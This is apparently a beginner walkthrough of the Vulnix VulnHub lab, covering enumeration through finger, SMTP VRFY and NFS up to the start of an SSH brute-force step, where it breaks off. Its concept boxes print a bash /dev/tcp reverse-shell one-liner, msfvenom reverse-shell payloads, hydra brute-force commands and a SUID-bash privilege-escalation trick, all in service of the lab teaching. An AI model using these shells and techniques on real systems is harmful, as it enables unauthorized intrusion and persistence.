# HackLAB: Vulnix — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HackLAB: Vulnix |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | Reboot User — <http://www.rebootuser.com/?p=933> |
| **Released** | 10 September 2012 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hacklab-vulnix,48/> |
| **Download** | <https://vulnhub.com/entry/hacklab-vulnix,48/#download> (`Vulnix.7z`, extract then import the OVA/VMDK) |
| **MD5 (archive)** | `0bf19d11836f72d22f30bf52cd585757` |
| **Attacker** | Kali Linux, host-only network |
| **Target OS** | Ubuntu Server 12.04 LTS, fully patched as of September 2012 |
| **Goal** | Read the trophy hidden in `/root/trophy.txt` |

> **Why this box is special.** The author's own description: *"Here we have a
> vulnerable Linux host with **configuration weaknesses rather than purposely
> vulnerable software versions**. The host is based upon Ubuntu Server 12.04 and is
> **fully patched** as of early September 2012."*
>
> Read that twice. There is **no CVE to exploit**. There is **no web server**. Every
> package is up to date. The box is broken purely because of *how it was configured*.
> That makes it the most realistic machine in this batch and an excellent teaching
> tool: misconfiguration, not missing patches, is what actually gets most
> organisations breached.
>
> Also note there is **no SSH password for `vulnix`** and the box is from 2012, so
> modern OpenSSH clients may complain about legacy key algorithms. See
> [§ 2.5 "Legacy SSH algorithm errors"](#25-legacy-ssh-algorithm-errors).

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (vulnix)   : 192.168.56.101
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Enumerating a large, unfamiliar attack surface** — 20+ open ports and no HTTP.
2. **Legacy UNIX services** you will rarely see but should recognise instantly:
   `finger`, `rpcbind`, `exec`/`login`/`shell` (the `r`-services), POP3/IMAP.
3. **SMTP user enumeration** with `VRFY` and `smtp-user-enum`.
4. **Finger user enumeration** with `finger-user-enum`.
5. **NFS fundamentals** — `rpcinfo`, `showmount`, mounting shares, and the `vers=`
   option.
6. **`root_squash` / `no_root_squash`** — the single most important NFS security
   setting, and exactly how it is abused.
7. **UID/GID impersonation** — why NFS trusts numbers, not names, and how creating a
   local user with a matching UID defeats the whole model.
8. **`nfspy`** — faking NFS credentials to bypass access checks.
9. **SSH key-based authentication** — generating a keypair, `authorized_keys`,
   permissions.
10. **`sudo -l` and the danger of `sudoedit` on a security-critical config file.**
11. **Placing a SUID-root `/bin/bash`** as a persistence technique (and why defenders
    hunt for it).

**The intended chain:**
`nmap` reveals ~20 ports, no HTTP → `finger` (79) and SMTP `VRFY` (25) enumerate
every account, including **`user`** and **`vulnix`** → `showmount -e` reveals
**`/home/vulnix *`** exported to *anyone* → `hydra` cracks `user`'s SSH password
(**`letmein`**) → from inside, `id vulnix` gives **UID 2008** → create a local user
with UID 2008, mount the NFS share, drop an SSH public key into
`/home/vulnix/.ssh/authorized_keys` → SSH in as **`vulnix`** → `sudo -l` shows
**`(root) NOPASSWD: sudoedit /etc/exports`** → add `/root *(rw,no_root_squash)` →
reboot the target → mount `/root` as local root → read **`trophy.txt`**.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4c:1a:2b, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.1    0a:00:27:00:00:0e   (Unknown: locally administered)
192.168.56.10   08:00:27:4c:1a:2b   PCS Systemtechnik GmbH
192.168.56.101  08:00:27:2f:9b:03   PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.101`**

> **Note:** this VM sometimes fails to obtain a DHCP lease. If `arp-scan` shows
> nothing, power the VM off, check *Settings → Network* is set to your host-only or
> bridged adapter, remove and re-add the adapter, and boot again. As a last resort,
> log in at the VM console (the author published no credentials for the console —
> but a `guest`-style account is not needed; you can simply read the IP from the
> console's `ifconfig` after any interactive login, or use `nmap -sn` on a wider
> range).

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — a big, unfamiliar attack surface

### 2.1 Scan the common ports first


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sV -sC -oN scans/vulnix-top.txt 192.168.56.101
```


> ### 📖 Concept — SMTP user enumeration
>
> **SMTP** (port 25) is mail transport, and two of its commands were designed to
> *validate* addresses — which means they disclose whether a user exists:
>
> ```bash
> nc target 25
> VRFY michael        # 250 = exists · 550 = does not
> EXPN admin          # expand a mailing list to its members
> ```
>
> Modern servers usually disable both. If so, the same information leaks from **login
> error messages** ("no such user" vs "wrong password") and from **RCPT TO** during a
> mail transaction. Automate it:
>
> ```bash
> smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t target
> hydra -L users.txt -P pass.txt smtp://target
> ```
>
> **Why this matters:** usernames are half of every credential pair. Enumerating them
> turns a two-unknown brute force into a one-unknown one — and lets you password-spray
> a single guess across many accounts while staying under lockout thresholds.
>
> Also worth trying: SMTP is sometimes configured to **relay** or to accept mail for
> local users, and `sendmail`/`exim` versions have well-known local root exploits.
> Check the banner version (`nc target 25` prints it immediately) against
> `searchsploit`.
>
> **Deep dive:** [CONCEPTS §9.6 — SMTP](../../docs/CONCEPTS.md#96-smtp--port-25)

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 13:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
79/tcp  open  finger      Linux fingerd
|_finger: No one logged on.\x0D
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP UIDL STLS SASL CAPA RESP-CODES PIPELINING
111/tcp open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      51573/tcp   mountd
|   100005  1,2,3      54054/udp   mountd
|   100021  1,3,4      40102/tcp   nlockmgr
|   100024  1          43104/tcp   status
|_  100227  2,3         2049/tcp   nfs_acl
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID more SASL-IR listed LOGIN-REFERRALS ENABLE OK capabilities post-login IDLE Pre-login IMAP4rev1 STARTTLS AUTH=PLAIN LITERAL+ LOGINDISABLED
512/tcp open  exec        netkit-rsh rexecd
513/tcp open  login       OpenBSD or Solaris rlogind
514/tcp open  tcpwrapped
MAC Address: 08:00:27:2F:9B:03 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  vulnix, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 42.18 seconds
```

Then the full port range, because NFS helper services land on high random ports:

```bash
sudo nmap -p- -T4 -oN scans/vulnix-all.txt 192.168.56.101
```

```text
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
79/tcp    open  finger
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
40102/tcp open  nlockmgr
43104/tcp open  status
51573/tcp open  mountd
57452/tcp open  unknown
```

> **How to read this — a service-by-service guide.** This is a *mail and file
> server*, not a web server. Learn to recognise each of these on sight:
>
> | Port | Service | What it is | Why it matters |
> | --- | --- | --- | --- |
> | **22** | OpenSSH 5.9p1 | Remote login | Our eventual entry. `5.9p1 Debian 5ubuntu1` ⇒ **Ubuntu 12.04**. |
> | **25** | Postfix | Mail transfer agent (SMTP) | `VRFY` is enabled ⇒ **user enumeration**. |
> | **79** | `fingerd` | Ancient "who is logged in / who are you" service | **User enumeration with rich detail.** Should never be internet-facing. |
> | **110 / 995** | Dovecot POP3 / POP3S | Mailbox retrieval | Auth surface. |
> | **143 / 993** | Dovecot IMAP / IMAPS | Mailbox retrieval | Auth surface. |
> | **111** | `rpcbind` (portmapper) | The **ONC RPC directory service** | Maps RPC program numbers → ports. **Required for NFS.** |
> | **512** | `rexecd` | Remote execution (r-services) | Plaintext-credential remote command execution. Obsolete, dangerous. |
> | **513** | `rlogind` | Remote login (r-services) | Predecessor of SSH; no encryption. |
> | **514** | `shell` / `rshd` | Remote shell | Same family. |
> | **2049** | **NFS** | Network File System | **The main event.** |
> | **51573** | `mountd` | NFS mount-request daemon | Answers "what is exported?" |
> | **40102** | `nlockmgr` | NFS file **lock** manager | |
> | **43104** | `status` | NFS lock **status** monitor | |
>
> **The r-services (512/513/514)** are the `r`-command family — `rexec`, `rlogin`,
> `rsh`. They authenticate by **source IP address and username in plaintext**, were
> designed for trusted LANs in the 1980s, and are why `.rhosts` files were a famous
> breach vector. Their presence alone on a 2012 server is a finding.
>
> **`rpcbind` on 111** is the key that unlocks everything NFS. `rpcinfo -p` asks it
> *"what RPC programs are registered, and on which ports?"* — which is how you find
> `mountd` on its random high port.

### 2.2 `rpcinfo` — ask the portmapper directly

```bash
rpcinfo -p 192.168.56.101
```

```text
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100024    1   udp  43104  status
    100024    1   tcp  43104  status
    100005    1   udp  54054  mountd
    100005    1   tcp  51573  mountd
    100005    2   udp  54054  mountd
    100005    2   tcp  51573  mountd
    100005    3   udp  54054  mountd
    100005    3   tcp  51573  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049  nfs_acl
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  40102  nlockmgr
    100021    3   udp  40102  nlockmgr
    100021    4   udp  40102  nlockmgr
    100021    1   tcp  40102  nlockmgr
```

> **`100003 = nfs`, `100005 = mountd`, `100021 = nlockmgr`, `100024 = status`.**
> Those program numbers are the ONC RPC registry IDs. Seeing 100003 + 100005 is the
> definitive "this host serves NFS" signal.

### 2.3 SMTP user enumeration (`VRFY`)

Nmap's banner showed **`VRFY`** in Postfix's capability list. `VRFY` is an SMTP verb
that asks the server *"does this mailbox exist?"* — designed for debugging, and a
gift to attackers.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.56.101
```

```text
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

----------------------------------------------------------
|                   Scan Information                     |
----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 6310
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Fri May  3 13:11:02 2024 #########
192.168.56.101: backup exists
192.168.56.101: bin exists
192.168.56.101: daemon exists
192.168.56.101: games exists
192.168.56.101: gnats exists
192.168.56.101: irc exists
192.168.56.101: list exists
192.168.56.101: lp exists
192.168.56.101: mail exists
192.168.56.101: man exists
192.168.56.101: news exists
192.168.56.101: nobody exists
192.168.56.101: postfix exists
192.168.56.101: proxy exists
192.168.56.101: root exists
192.168.56.101: sshd exists
192.168.56.101: sync exists
192.168.56.101: sys exists
192.168.56.101: user exists          <-- real, interactive account
192.168.56.101: uucp exists
192.168.56.101: vulnix exists        <-- real, interactive account
192.168.56.101: www-data exists
######## Scan completed at Fri May  3 13:14:38 2024 #########
22 results.

6310 queries in 216 seconds (29.2 queries / sec)
```

Do the same by hand so you understand what the tool is doing:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc 192.168.56.101 25
```

```text
220 vulnix ESMTP Postfix (Ubuntu)
VRFY user
252 2.0.0 user
VRFY root
252 2.0.0 root
VRFY nosuchuser123
550 5.1.1 <nosuchuser123>: Recipient address rejected: User unknown in local recipient table
QUIT
221 2.0.0 Bye
```

> **How to read the SMTP responses:**
> - **`252 2.0.0 user`** → "I cannot VRFY it for policy reasons, but *something*
>   answered" — in Postfix this means **the user exists**.
> - **`550 5.1.1 ... User unknown`** → the user definitively **does not exist**.
>
> That difference is the oracle. It is a **user-enumeration vulnerability**, and it
> is why mail servers should return `550` for *everything* to unauthenticated
> senders (`smtpd_discard_ehlo_keywords`, or better: disable VRFY entirely).
>
> **Two human accounts: `user` and `vulnix`.** Everything else is a system/service
> account (`bin`, `daemon`, `postfix`, `www-data`, …).

### 2.4 Finger user enumeration — richer detail

```bash
finger @192.168.56.101
```

```text
[vulnix]
No one logged on.
```

```bash
finger user@192.168.56.101
```

```text
Login: user                             Name:
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

```bash
finger vulnix@192.168.56.101
```

```text
Login: vulnix                           Name:
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

Enumerate a whole wordlist with pentestmonkey's dedicated tool:

```bash
git clone https://github.com/pentestmonkey/finger-user-enum
./finger-user-enum/finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.56.101
```

```text
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

Mode ..................... standard
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 6310
Target TCP port .......... 79
Query timeout ............ 5 secs

######## Scan started at Fri May  3 13:18:04 2024 #########
192.168.56.101: backup exists
192.168.56.101: bin exists
...
192.168.56.101: root exists
192.168.56.101: user exists
192.168.56.101: vulnix exists
...
######## Scan completed at Fri May  3 13:21:40 2024 #########
30 results.
```

Or with Metasploit:


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```bash
msf6 > use auxiliary/scanner/finger/finger_users
msf6 auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.56.101
msf6 auxiliary(scanner/finger/finger_users) > set USER_FILE /usr/share/seclists/Usernames/Names/names.txt
msf6 auxiliary(scanner/finger/finger_users) > run
```

```text
[+] 192.168.56.101:79       - Users found: backup, bin, daemon, dovecot, dovenull, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, proxy, root, sshd, sync, sys, syslog, user, uucp, vulnix, whoopsie, www-data
[*] 192.168.56.101:79       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> **Why finger leaks more than SMTP.** `finger` returns the account's **login name,
> real name, home directory, shell, last login time, idle time, and `.plan`/`.project`
> file contents.** That is a complete profile.
>
> The two facts that matter here:
> - **`user` → `/home/user`, shell `/bin/bash`** ⇒ an interactive account we can SSH
>   into.
> - **`vulnix` → `/home/vulnix`, shell `/bin/bash`** ⇒ an interactive account whose
>   home directory is the one NFS is exporting (§ 2.5). **Connecting those two dots is
>   the whole box.**
>
> Finger was discontinued from essentially every hardened system precisely because of
> this. Seeing it in 2026 should be an immediate red flag.

![Finger and SMTP user enumeration](images/01-finger.png)

### 2.5 Legacy SSH algorithm errors

Ubuntu 12.04's OpenSSH 5.9 offers only `ssh-rsa` (SHA-1) and `ssh-dss` host keys and
key-exchange algorithms that modern clients reject by default. If you see:

```text
Unable to negotiate with 192.168.56.101 port 22: no matching key exchange method found.
Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

or

```text
no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

fix it per-invocation:

```bash
ssh -o KexAlgorithms=+diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    user@192.168.56.101
```

or persistently in `~/.ssh/config`:

```text
Host 192.168.56.101
    KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa,ssh-dss
    PubkeyAcceptedAlgorithms +ssh-rsa
```

> **This is not a lab-only annoyance.** Thousands of legacy network devices, IPMI
> controllers, printers and industrial systems still speak only SHA-1 SSH. Knowing the
> exact flags saves hours. **It is also a finding:** SHA-1 key exchange is deprecated
> and should be upgraded.

### 2.6 NFS enumeration — `showmount`


> ### 📖 Concept — Why is NFS such a dangerous service?
>
> **NFS** (Network File System, ports 111 + 2049) lets a remote client mount a
> directory. Its access control is based on **IP address and UID** — there are **no
> passwords at all**. If an export is readable from your address, you can read it.
>
> ```bash
> showmount -e target                  # what is exported, and to whom?
> sudo mount -t nfs target:/export /mnt/t
> cat /etc/exports                     # or read it through any LFI you have
> ```
>
> **The strings that decide everything in an export line:**
>
> | Option | Meaning | Consequence |
> | --- | --- | --- |
> | `*` | exported to **everyone** | No authentication exists — anyone on the network reads it |
> | `rw` | clients may **write** | You can plant files on the target |
> | **`no_root_squash`** | client root is **honoured** as target root | Write a SUID binary or an SSH key → **instant root** |
> | `root_squash` *(default)* | client root demoted to `nobody` | Defeats the above |
>
> **Two attack patterns follow.** If the export is inside the web root, `rw` plus any
> **LFI** becomes remote code execution: write a PHP shell via NFS, trigger it through
> `include()`. If `no_root_squash` is set, mount it as root on Kali and create
> `cp /bin/bash /mnt/share/rootbash; chmod +s /mnt/share/rootbash` — then run
> `rootbash -p` on the target as any user.
>
> **Deep dive:** [CONCEPTS §9.4 — NFS](../../docs/CONCEPTS.md#94-nfs--ports-111--2049) ·
> [§15.10 — NFS no_root_squash](../../docs/CONCEPTS.md#1510-nfs-no_root_squash)

```bash
showmount -e 192.168.56.101
```

```text
Export list for 192.168.56.101:
/home/vulnix *
```

> **Stop and read those two characters at the end: `*`.**
>
> `showmount -e` asks `mountd` (port 51573) for the export list. The output is
> `<exported directory>  <clients allowed to mount it>`. Here the client list is
> **`*` — any host on any network.**
>
> That means the **entire home directory of user `vulnix` is exported, read-write,
> to the whole world.** That is the primary misconfiguration of this box.
>
> Other flags:
> ```bash
> showmount -a 192.168.56.101     # who is currently mounting what
> showmount -d 192.168.56.101     # directories currently mounted by clients
> ```
> And Nmap can do it too:
> ```bash
> sudo nmap -p 111 --script nfs-showmount,nfs-ls,nfs-statfs 192.168.56.101
> ```
> ```text
> PORT    STATE SERVICE
> 111/tcp open  rpcbind
> | nfs-showmount:
> |   /home/vulnix *
> |_  rpcbind
> ```

![showmount revealing the world-exported /home/vulnix](images/02-showmount.png)

---

## 3. Foothold — two tracks, run them in parallel

### 3.1 Track 1: try to mount the NFS share as-is

```bash
sudo apt install nfs-common          # provides mount.nfs, showmount
sudo mkdir -p /tmp/mnt
sudo mount -t nfs -o vers=3 192.168.56.101:/home/vulnix /tmp/mnt
sudo ls -la /tmp/mnt
```

```text
ls: cannot open directory '/tmp/mnt': Permission denied
```

```bash
stat /tmp/mnt
```

```text
  File: /tmp/mnt
  Size: 4096        Blocks: 8          IO Block: 32768  directory
Device: 0:41        Inode: 129         Links: 2
Access: (0750/drwxr-x---)  Uid: (65534/  nobody)   Gid: (4294967294/ UNKNOWN)
Access: 2012-09-02 19:25:05.000000000 +0100
Modify: 2012-09-02 19:25:02.000000000 +0100
Change: 2012-09-02 19:25:02.000000000 +0100
 Birth: -
```

> **The mount worked, but we cannot read it.** Read the `stat` output carefully — it
> contains the whole lesson:
>
> - `Access: (0750/drwxr-x---)` → the exported directory allows
>   **owner: rwx, group: r-x, other: ---**. We are "other", so: nothing.
> - `Uid: (65534/nobody)` → **we are being seen as `nobody`, not as `root`.**
>
> That is **`root_squash`**.
>
> **What `root_squash` does:** NFS has no concept of usernames on the wire — it
> transmits raw numeric **UID/GID**. Without protection, a client's `root` (UID 0)
> would arrive at the server as UID 0 and have root over the export. `root_squash`
> prevents this by **remapping any incoming UID 0 to the unprivileged `nobody`
> account (UID 65534)** before permission checks run. It is on by default and is the
> single most important NFS hardening option.
>
> `Gid: 4294967294` is `nobody`'s group rendered as an unsigned 32-bit value of `-2`
> — a quirk of the NFSv3 wire format when the server cannot map the group.
>
> **So the question becomes: what UID *does* have access?** The directory is `0750`
> owned by UID 65534-as-seen-by-us… which is really the *squashed* view. We need the
> **true** owner UID. Two ways to find out:
> 1. Log in to the box some other way and run `id vulnix` (§ 3.2).
> 2. Use **`nfspy`**, which spoofs the NFS client's credentials (§ 3.3).

### 3.2 Track 1a: brute force SSH for `user`

We have two candidate usernames from § 2.3/2.4. Start hydra in the background while
